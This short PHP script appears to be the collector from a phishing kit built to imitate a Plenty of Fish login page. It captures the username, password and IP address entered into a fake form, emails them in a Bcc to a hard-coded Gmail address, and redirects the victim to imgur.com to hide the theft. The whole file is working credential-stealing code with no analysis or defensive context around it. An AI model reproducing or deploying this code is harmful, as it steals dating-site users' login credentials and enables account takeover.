<?
$ip = getenv("REMOTE_ADDR");
$message .= "--------------Pof ReSulT by Pussy-----------------------\n";
$message .= "Username       : ".$_POST['username']."\n";
$message .= "Password      : ".$_POST['password']."\n";
$message .= "------------------------IP------------------------------\n";
$message .= "IP                : $ip\n";$IP=$_POST['IP'];
$message .= "--------------Pof Created by Pussy----------------------\n";
$send = "";
$bcc="caroseeking9@gmail.com" ;
$subject = "Pof details ".$_POST['username'];
$headers .= $_POST['password']."\n";



mail($send, $subject, $message, "Bcc: $bcc");


header("Location: http://imgur.com");
?>